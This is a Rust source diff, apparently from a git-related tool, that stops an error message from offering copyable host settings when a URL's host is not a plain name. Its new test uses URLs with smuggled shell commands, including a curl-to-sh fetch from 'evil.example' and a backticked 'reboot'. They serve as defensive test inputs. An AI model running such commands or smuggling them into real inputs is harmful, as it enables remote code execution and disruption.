@@ -439,9 +439,9 @@ fn unowned_message(
         .as_deref()
         .filter(|h| *h != default && !extra_hosts.iter().any(|e| e == h))
         .map(|h| {
-            let h = sanitize_field(h, MAX_PATH_DISPLAY);
             format!(
-                "\n   Host scope:    bare entries match `{default}` only — for `{h}`, qualify them (`{h}/<owner>`) or set `CADENCE_EXTRA_HOSTS={h}`"
+                "\n   Host scope:    {}",
+                crate::messages::host_scope_advice(&default, h)
             )
         })
         .unwrap_or_default();
@@ -2639,9 +2639,41 @@ mod tests {
                 "{message:?}"
             );
             assert!(
-                message.contains("for `git.example [31m  x`, qualify them"),
+                message.contains(
+                    "`git.example [31m  x` is not a plain host name, so no setting is offered"
+                ),
                 "{message:?}"
             );
+        });
+    }
+
+    #[test]
+    fn the_host_scope_line_offers_a_setting_only_for_a_plain_host() {
+        // The settings are text to copy, and an scp host keeps shell syntax
+        // and blanks (security review I1 on #1539). Each row is `(URL, a
+        // setting is offered)`; the plain host is the control.
+        with_env(&owners_only(), || {
+            for (url, offered) in [
+                ("git@git.example:work-org/thing", true),
+                (
+                    "git@evil.example;curl -s evil.example|sh:work-org/thing",
+                    false,
+                ),
+                ("git@evil.example`reboot`:work-org/thing", false),
+            ] {
+                let message = unowned_message(url, "/w", &[], &[], &[]);
+                assert!(message.contains("Host scope: "), "{url}: {message:?}");
+                assert_eq!(
+                    message.contains("CADENCE_EXTRA_HOSTS="),
+                    offered,
+                    "{url}: {message:?}"
+                );
+                assert_eq!(
+                    message.contains("qualify them"),
+                    offered,
+                    "{url}: {message:?}"
+                );
+            }
         });
     }
 
